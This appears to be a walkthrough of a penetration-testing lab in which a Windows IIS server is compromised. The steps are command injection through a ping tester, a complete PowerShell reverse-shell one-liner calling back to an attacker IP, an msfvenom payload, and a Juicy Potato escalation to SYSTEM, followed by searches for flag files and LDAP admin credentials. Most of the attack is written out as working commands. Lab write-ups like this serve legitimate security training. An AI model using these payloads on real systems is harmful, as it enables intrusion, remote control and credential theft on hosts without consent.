# Windows Privilege Escalation Skills Assessment - Part I
During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

## 🔎 Initial Recon with Nmap
My first step was to identify open ports and services running on the target machine using a stealthy scan:
```bash
sudo nmap -sC -sV -Pn 10.129.225.12
```
![image](https://github.com/user-attachments/assets/2692cd59-62af-4611-b4ba-183d66e38bc9)

**Key Findings:**
Port 80 is running Microsoft IIS 10.0, showing a basic page titled “DEV Connection Tester.”

Port 3389 is open but not useful in our case since we don’t have valid credentials for RDP.

TRACE is enabled, which could be risky, but the bigger lead is the web interface.

## 🌐 Accessing the Web Interface
Visiting http://10.129.225.12/ in the browser revealed something interesting — a webshell interface.
After a few attempts, I realized the interface accepted system commands and returned output, albeit in a sanitized format.

![image](https://github.com/user-attachments/assets/4c92a944-0c39-453b-bd66-f8efe498db3f)

When I tested with whoami; responded with host not found. 

## 🧪 Testing Command Injection Behavior
To understand the command parser behind the webshell, I tested some basic input tricks:
```bash
127.0.0.1 | whoami
```
This worked and printed the result — suggesting the backend was piping the input and not strictly validating or sanitizing it. This was crucial for payload crafting.

![image](https://github.com/user-attachments/assets/ebc32339-7cff-457b-96ba-a4c162a8dddc)

## 🕵️‍♂️ Exploiting for Reverse Shell
Since we couldn’t interact directly with the shell, I needed a PowerShell reverse shell payload that could be injected via this command interface.

Here’s the PowerShell one-liner I used:
```bash
127.0.0.1 | powershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient('10.10.14.45',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
🔥 The use of `127.0.0.1 |` helped bypass some restrictions in the input handling logic.

## 🛎️ Setting Up a Netcat Listener
On my attacker machine, I set up a listener to catch the reverse shell:
```bash
nc -lvnp 4444
```
After submitting the payload via the webshell, I received a connection!
Got a reverse shell as a low-privilege user.

![image](https://github.com/user-attachments/assets/c34679cc-f34e-4727-9867-49226bdbcb8f)

## 🔍 Privilege Escalation Discovery
Checked for privileges with `whoami /priv` command and found that `SeImpersonatePrivilege` Enabled.

![image](https://github.com/user-attachments/assets/fe146445-f6ab-48bb-9626-aed0c7211573)

Machine is vulnerable to Juicy Potato privilege escalation (Windows Server 2016 + SeImpersonate).

## 🛠️ Tool Transfer and Execution
**Setup HTTP Server (Attacker)**
```wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
python3 -m http.server 8080
```
**Transfer JuicyPotato to Victim**
```bash
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.45:8080/JuicyPotato.exe','C:\Tools\jp.exe')"
```
**Create Reverse Shell Payload**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.45 lport=9999 -f raw > shell.bat
```
Transfer shell.bat using the same HTTP server and PowerShell download method.
**Execute Juicy Potato**
```bash
C:\Tools\jp.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\shell.bat" -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
```
![image](https://github.com/user-attachments/assets/9957404b-d484-4015-a238-3ab08319a021)

**Set listener:**
```bash
nc -lvnp 9999
```
![image](https://github.com/user-attachments/assets/3dafa90c-05ff-4b14-8e1b-09c833856c18)

## ✅ Privilege Escalation Achieved
In the new shell:
```bash
whoami
```
![image](https://github.com/user-attachments/assets/cd86fdc8-9d5c-4d23-9b2a-5ac75807a5de)

## 🎯 Post Exploitation and Flag Retrieval
**Search for Sensitive Files**
```bash
dir C:\ /s /b | findstr /i "confidential.txt"
```
Found confidential.txt containing a flag.

![image](https://github.com/user-attachments/assets/7090d170-1003-47a3-aeb3-d757ad0eac1f)

**Administrator Flag**
Negivated to the Administrator's Desktop and found a flag.

**Search for LDAP Password**
```bash
powershell -Command "Get-ChildItem -Path C:\Users\ -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern 'ldapadmin'"
```
![image](https://github.com/user-attachments/assets/a2cbaa77-0854-4e05-80c3-4647842127b2)

Successfully found credentials or strings related to `ldapadmin`.

**Patch Check**
`systeminfo' gave two KB's running in the system.
